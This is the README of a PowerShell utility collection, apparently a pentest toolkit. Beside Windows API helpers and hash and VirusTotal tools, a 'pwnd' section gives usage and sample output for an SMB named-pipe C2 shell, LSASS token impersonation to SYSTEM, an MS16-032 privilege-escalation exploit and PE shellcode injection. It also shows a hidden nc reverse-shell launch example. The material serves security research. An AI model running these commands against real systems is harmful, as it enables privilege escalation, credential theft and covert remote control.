# PowerShell-Suite

There are great tools and resources online to accomplish most any task in PowerShell, sometimes however, there is a need to script together a util for a specific purpose or to bridge an ontological gap. This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.

As such the mileage you get out of them may vary but feel free to post issues or fork & adapt!

## Windows API

Some resources to consult on Windows API access from PowerShell:
* FuzzySecurity: [Low-Level Windows API Access From PowerShell](http://www.fuzzysecurity.com/tutorials/24.html)
* Microsoft TechNet: [Use PowerShell to Interact with the Windows API](https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/)
* Exploit Monday: [Accessing the Windows API in PowerShell via internal .NET methods and reflection](http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html)
* Exploit Monday: [Deep Reflection - Defining Structs and Enums in PowerShell](http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html)

### Invoke-Runas

Functionally equivalent to Windows "runas.exe", using Advapi32::CreateProcessWithLogonW.

```
Start cmd with a local account.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1

Start cmd with remote credentials. Equivalent to "/netonly" in runas.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2
```

### Invoke-NetSessionEnum

Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.

```
Enumerate active sessions on "SomeHostName".
C:\PS> Invoke-NetSessionEnum -HostName SomeHostName
```

### Invoke-CreateProcess

Use Kernel32::CreateProcess to achieve fine-grained control over process creation from PowerShell.

```
Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1

Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1
```

### Detect-Debug

Showcase a number of techniques to detect the presence of Kernel/User-Mode debuggers from PowerShell.

```
Sample below is x64 Win8, WinDbg attached to PowerShell.
C:\PS> Detect-Debug

[+] Detect Kernel-Mode Debugging
    [?] SystemKernelDebuggerInformation: False

[+] Detect User-Mode Debugging
    [?] CloseHandle Exception: Detected
    [?] IsDebuggerPresent: Detected
    [?] CheckRemoteDebuggerPresent: Detected
    [?] PEB!BeingDebugged: Detected
    [?] PEB!NtGlobalFlag: Detected
    [?] DebugSelf: Detected
```

### Get-Handles

Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process, works on x32/x64.

```
Get handles for PID 2288
C:\PS> Get-Handles -ProcID 2288

[>] PID 2288 --> notepad
[+] Calling NtQuerySystemInformation::SystemHandleInformation
[?] Success, allocated 449300 byte result buffer

[>] Result buffer contains 28081 SystemHandleInformation objects
[>] PID 2288 has 71 handle objects

 PID ObjectType      HandleFlags        Handle KernelPointer AccessMask
 --- ----------      -----------        ------ ------------- ----------
2288 Directory       NONE               0x0004 0x88E629F0    0x00000000
2288 File            NONE               0x0008 0x84560C98    0x00100000
2288 File            NONE               0x000C 0x846164F0    0x00100000
2288 Key             NONE               0x0010 0xA3067A80    0x00020000
2288 ALPC Port       NONE               0x0014 0x8480C810    0x001F0000
2288 Mutant          NONE               0x0018 0x8591FEB8    0x001F0000
2288 Key             NONE               0x001C 0x96719C48    0x00020000
2288 Event           NONE               0x0020 0x850C6838    0x001F0000
...Snip...
```

### Get-TokenPrivs

Open a handle to a process and use Advapi32::GetTokenInformation to list the privileges associated with the process token.

```
Get token privileges for PID 3836
C:\PS> Get-TokenPrivs -ProcID 3836

[?] PID 3836 --> calc
[+] Process handle: 1428
[+] Token handle: 1028
[+] Token has 5 privileges:

LUID Privilege
---- ---------
  19 SeShutdownPrivilege
  23 SeChangeNotifyPrivilege
  25 SeUndockPrivilege
  33 SeIncreaseWorkingSetPrivilege
  34 SeTimeZonePrivilege
```

## pwnd

### Invoke-SMBShell

POC shell using named pipes (System.IO.Pipes) as a C2 channel. The SMB traffic is encrypted using AES CBC (code from Empire), the key/pipe are generated randomly by the server on start-up.

**Server:**
```
PS C:\> Invoke-SMBShell

+-------
| Host Name: 0AK
| Named Pipe: tapsrv.5604.yk0DxXvjUD9xwyJ9
| AES Key: q6EKfuJTX93YUnmX
+-------

[>] Waiting for client..


SMB shell: whoami
0ak\b33f

SMB shell: IdontExist
The term 'IdontExist' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.

SMB shell: $PSVersionTable
Name                           Value
----                           -----
PSRemotingProtocolVersion      2.2
BuildVersion                   6.2.9200.17065
PSCompatibleVersions           {1.0, 2.0, 3.0}
PSVersion                      3.0
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
SerializationVersion           1.1.0.1

SMB shell: leave

[!] Client disconnecting..

[>] Waiting for client..


SMB shell: calc
Job SMBJob-dVkIkAkXINjMe09S completed successfully!

SMB shell: exit

[!] Client disconnecting..
[!] Terminating server..

PS C:\>
```

**Client:**
```
# Client disconnected because of "leave" command
PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
# Client disconnected because "exit" command kills client/server
PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
```

### Conjure-LSASS

Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.

```
Conjure LSASS into our midst! ;)
C:\PS> Conjure-LSASS

[?] SeDebugPrivilege is available!

[+] Current process handle: 852

[>] Calling Advapi32::OpenProcessToken
[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: 2000

[?] SeDebugPrivilege is enabled!

[>] Calling Advapi32::OpenProcessToken --> LSASS
[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: 1512

[>] Calling Advapi32::DuplicateToken --> LSASS
[+] Duplicate token handle with SecurityImpersonation level: 2008

[>] Calling Advapi32::SetThreadToken
[+] Knock knock .. who's there .. LSASS
[+] User context: SYSTEM

C:\PS> whoami
ERROR: Access is denied.
ERROR: Access is denied.

C:\PS> Get-ChildItem -Path hklm:SAM

    Hive: HKEY_LOCAL_MACHINE\SAM


SKC  VC Name                           Property
---  -- ----                           --------
  3   2 SAM                            {C, ServerDomainUpdates}
```

### Invoke-MS16-032

PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
    
Targets:

* Win7-Win10 & 2k8-2k12 <== 32/64 bit!
* Tested on x32 Win7, x64 Win8, x64 2k12R2

==> Not tested on Vista with PowerShell v1, let me know what happens if you are able to check this!

```
Sit back and watch the pwn!
C:\PS> Invoke-MS16-032
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 956

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 964
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

### Subvert-PE

Inject shellcode into a PE image while retaining the PE functionality.

For additional information, please refer to:

* FuzzySecurity: [Powershell PE Injection, this is not the Calc you are looking for!](http://www.fuzzysecurity.com/tutorials/20.html)

```
Analyse the PE header and hexdump the region of memory where shellcode would be injected.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe

Same as above but continue to inject shellcode and overwrite the binary.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write
```

## Utility

### Calculate-Hash

PowerShell v2 compatible script to calculate file hashes. I quickly scripted this together because Get-FileHash is only available in v4+.

```
Get the SHA512 hash of "C:\Some\File.path".
C:\PS> Calculate-Hash -Path C:\Some\File.path -Algorithm SHA512
```

### Check-VTFile

Submit SHA256 hash of a file to Virus Total and retrieve the scan report if the hash is known. This requires you to get a, free, VirusTotal API key. Again, lot's of better projects out there for this but not PowerShell v2 compatible.

```
C:\PS> Check-VTFile -Path C:\Some\File.path
```